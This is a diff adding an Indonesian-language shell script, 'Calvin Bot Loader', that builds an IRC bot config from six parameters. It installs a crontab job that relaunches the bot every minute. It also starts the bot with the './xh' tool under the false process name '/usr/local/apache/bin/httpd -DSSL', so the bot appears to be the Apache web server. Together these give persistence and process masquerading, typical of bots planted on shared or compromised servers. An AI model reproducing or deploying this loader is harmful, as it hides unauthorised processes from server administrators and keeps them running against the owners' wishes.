@@ -1,0 +1,94 @@
+#!/bin/sh
+
+echo "---------------------------"
+echo "  Calvin  Tcl Tools 1 .0   "
+echo "    By Calvin 2010         "
+echo "  http://planetwork.id     "
+echo "---------------------------"
+echo ""
+
+if test $# -ne 6
+then
+  echo "Cara Penggunaan :"
+  echo ""
+  echo "   ./gbz pr1 pr2 pr3 pr4 pr5 pr6"
+  echo ""
+  echo "   pr1 = nama file conf yg akan dibuat"
+  echo "   pr2 = nick"
+  echo "   pr3 = ident"
+  echo "   pr4 = IP"
+  echo "   pr5 = nama channel (jangan pake #)"
+  echo "   pr6 = nick owner"
+  echo ""
+  exit
+fi
+
+if ! test -s scripts/calvin
+then
+  echo "Kesalahan : file calvin tidak ditemukan !!!"
+  echo ""
+  exit
+fi
+
+if ! test -s pnt.conf
+then
+  echo "Kesalahan : file pnt.conf tidak ditemukan !!!"
+  echo ""
+  exit
+fi
+
+if ! test -s scripts/calvin
+then
+  echo "Kesalahan : file calvin tidak ditemukan !!!"
+  echo ""
+  exit
+fi
+
+if ! test -s pnt.conf
+then
+  echo "Kesalahan : file pnt.conf tidak ditemukan !!!"
+  echo ""
+  exit
+fi
+
+echo "set nick "\"$2\" > $1
+echo "set username "\"$3\" >> $1
+echo "set my-hostname "\"$4\" >> $1
+echo "set my-ip "\"$4\" >> $1
+echo "set basechan "\"\#$5\" >> $1
+echo "set owner "\"$6\" >> $1
+echo " Config file : "$1""
+cat $1
+echo "set userfile "\"$2.usr\" >> $1
+echo "set chanfile "\"$2.chn\" >> $1
+echo "set altnick "\"$2--\" >> $1
+
+
+cat pnt.conf >> $1
+pwd > $1.dir
+dir=$(cat $1.dir)
+echo "* * * * * $dir/$1.upd >/dev/null 2>&1" > $1.d
+crontab $1.d
+crontab -l | grep $1.upd
+echo "
+if test -r $dir/pid.$1; then
+pid=\$(cat $dir/pid.$1)
+if \$(kill -CHLD \$pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+cd $dir
+./$1.run &>/dev/null" > $1.upd
+chmod u+x $1.upd
+echo "
+./xh -s \"/usr/local/apache/bin/httpd -DSSL\" ./httpd -m $1
+" > $1.run
+chmod u+x $1.run
+
+
+echo ""
+echo "ketik: ./dor config botmu  untuk menjalankan bot anda"
+echo ""
+echo "Calvin Bot Loader sYsTem Has Loaded Succesfully"
+
